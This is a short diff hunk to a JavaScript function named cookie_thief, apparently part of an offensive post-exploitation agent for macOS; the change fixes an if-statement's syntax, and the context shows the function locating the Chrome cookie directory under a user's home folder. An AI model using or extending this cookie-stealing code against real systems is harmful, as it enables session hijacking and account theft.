@@ -17,7 +17,7 @@ exports.cookie_thief = function(task, command, params){
       username = $.NSUserName();
     }
     if(config.hasOwnProperty("browser") && typeof config['browser'] == 'string'){ browswer = config['browser']; }
-    if browser == "chrome" {
+    if(browser == "chrome") {
       cookiedir = chromeCookieDir;
     }
     cookieDLPath = homedir + cookiedir;
